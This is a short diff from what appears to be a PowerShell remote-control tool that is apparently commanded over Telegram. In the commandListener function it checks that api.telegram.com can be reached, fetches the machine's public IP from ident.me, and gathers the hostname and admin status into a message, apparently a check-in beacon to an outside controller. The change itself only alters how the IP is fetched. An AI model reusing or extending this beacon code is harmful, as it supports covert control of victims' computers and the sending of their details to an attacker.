@@ -96,7 +96,7 @@ function commandListener
         try {
             if ($mini_setup -eq 0) {
                 if ((Test-NetConnection -ComputerName "api.telegram.com").PingSucceeded) {
-                    $_ip    = (Invoke-WebRequest -Uri "https://ident.me/").Content                  # Get the Public IP from the ISP
+                    $_ip    = Invoke-RestMethod -Method Get -Uri "https://ident.me/"                # Get the Public IP from the ISP
                     $_user  = checkAdminRights                                                      # Get the boolean value to check if the user is an administrator or not
                     $_host  = $env:COMPUTERNAME                                                     # Get the current Hostname or the name of the machine
                     $_body  = '{0} ({1}) - IP: {2}' -f $_host, $_user, $_ip                         # Build everything...
